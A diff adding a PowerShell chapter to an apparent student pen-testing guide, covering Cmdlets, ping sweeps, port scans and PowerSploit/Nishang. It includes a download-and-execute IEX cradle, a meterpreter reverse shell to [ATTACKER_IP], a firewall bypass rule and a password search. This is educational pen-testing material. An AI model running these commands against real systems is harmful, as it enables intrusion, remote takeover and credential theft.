@@ -15,6 +15,8 @@
 	- 3.1 Useful Commands
 	- 3.2 Basic Batch File Scripting
 4. Windows Powershell
+	- 4.1 Powershell Commands
+	- 4.2 Powershell Exploitation / Pen-testing Frameworks
 5. Windows Registry
 	- 5.1 Overview
 	- 5.2 CLSID
@@ -337,6 +339,109 @@ Again, this is just a very small program and there are many other methods / func
 ---
 
 ### 4. Windows Powershell
+Powershell is the succesor to `cmd.exe`. Note that all command (Cmdlets) in Powershell can also be run in Command Prompt with the following command:
+```bat
+powershell -c [CMDLET]
+```
+
+#### 4.1 PowerShell Commands
+Powershell makes use of Cmdlets, which are basically light-weight commands are typically organized as Verb-Noun strings. As usual, we start off with the most important stuff on how to get help:
+```powershell
+get-help [COMMAND]
+- Get help for a specific command, can use "a*" to get help for commands starting with 'a'
+
+[CMDLET] -?
+- Gets the help page for a specific CMDLET
+```
+
+Here are some of the most used commands for 'reasons':
+```powershell
+Copy-Item [SRC] [DEST]
+- Copy an item from [SRC] to [DEST] (similar to cp)
+
+Move-Item [SRC] [DEST]
+- Move an item from [SRC] to [DEST] (similar to mv)
+
+Get-Content [FILE]
+- Displayes the content of a file (similar to cat)
+
+Get-Process
+- Get a process listing (similar to ps)
+
+Get-Service | where { $_.Status -eq "running"} | Select-Object -last 10
+- Gets a list of services that are "running", then we select the last 10 of them
+
+Select-String -Path "C:\MyFolder\*.txt" -Pattern "PASSWORD" -CaseSensitive
+- Select all text files in C:\MyFolder and find all files containing the string "PASSWORD" (case-sensitive)
+
+Get-FileHash -Algorithm SHA1 [FILE]
+- Get the SHA1-hash of [FILE]
+```
+
+Powershell can also do some pretty nice networking stuff, such as conducting a ping sweep (e.g. from 10.10.10.1 to 10.10.10.255):
+```powershell
+1..255 | % {echo "10.10.10.$_"; ping -n -1 10.10.10.$_ | Select-String ttl; }
+```
+(We ping 1 type to each address, get all those with replies with "ttl" to know with IP addresses have hosts responding to pings)
+
+Or conduct a TCP Port scan in a similar manner:
+```powershell
+1..65535 | % {echo ((New-Object Net.Sockets.TcpClient).Connect("12.34.56.78", $_)) | "Port $_ is open!" }
+```
+(Create a new `Net.Socket.TcpClient` that attempts to connect to 12.34.56.78 for ports 1-65535) and tells us that "Port _ is open" for all open ports (i.e. TCP connection established)
+
+Or get a file via HTTP (equivalent of wget):
+```powershell
+(NEW-OBJECT System.Net.Webclient).DownloadFile("http://10.10.10.10/nc.exe", "nc.exe")
+```
+(Downloads the file nc.exe from 10.10.10.10 as 'nc.exe' placed in the present working directory. Done via creating a new `System.Net.Webclient` object)
+
+Or let ourselves through the firewall:
+```powershell
+Get-NetFirewallRule -all
+- Get all existing firewall rules
+
+New-NetFirewallRule -Action Allow -DisplayName YOUSHALLPASS -RemoteAddress 10.10.10.25
+- Adds a new firewall rule "YOUSHALLPASS" that allows all incoming traffic from IP address 10.10.10.25
+
+```
+
+Additional utilies can also prove useful, e.g. ASCII to base64:
+```powershell
+[System.Convert]::Tobase64String([System.Text.Encoding]::UTF8.getBytes("NUSGREYHATS"))
+```
+Converts the string "NUSGREYHATS" to its base64 equivalent, which is `TlVTR1JFWUhBVFM=`
+
+We can also find some other information that maybe interesting:
+```powershell
+Get-HotFix
+- Provides a list of all HotFixes installed on this Windows OS
+
+PS C:\> cd HKLM:
+PS C:\> ls
+- Change into HKLM (Windows registry) and display sub-directories etc. (i.e. navigation)
+```
+
+#### 4.2 Powershell Exploitation / Pen-testing Frameworks
+In order to make all this Powershell stuff abit more efficient, we can make use of [Nishang](https://github.com/samratashok/nishang), A framework using Powershell for offensive security and penetration testing. It includes tools such as KeyLogger, Get-PassHashes (password hashes of user accounts), Get-WLAN-Keys (Keys used for WLAN networks etc.)
+
+Alternatively, we also have [Powersploit](https://github.com/PowerShellMafia/PowerSploit), which happens to be a pretty neat thing for executing bad stuff. Most notably, assuming PowerSploit is already on the target Windows machine, we can try downloading a new Cmdlet named `Invoke-ShellCode` via the following:
+```powershell
+IEX(New-Object Net.WebClient).DownloadString("http://10.10.10.1:8000/CodeExecution/Invoke-Shellcode.ps1")
+```
+Note that `IEX` is the short-hand for `Invoke-Expression`. This basically Downloads `Invoke-Shellcode` as a string to be invoked as code later.
+
+To play around with the new `Invoke-Shellcode`, we can launch anything we want, such as:
+```powershell
+Invoke-Shellcode -Payload [NUKETHECOMPUTER]
+```
+Which may effective nuke the computer (i.e. explode). Maybe something more realistic can be to set-up a reverse shell with a combination of meterpreter as illustrated [here](https://null-byte.wonderhowto.com/how-to/hack-like-pro-use-powersploit-part-1-evading-antivirus-software-0165535/):
+```powershell
+PS > Invoke-Shellcode -Payload windows/meterpreter/reverse_http -lhost [ATTACKER_IP] -lport [ATTACKER_LISTENING_PORT] -Force
+```
+(Basically you get connection from Windows to you so you gain control of it remotely, will be elaborated below)
+
+Feel free to explore more of it if you so wish!
 
 ---
 
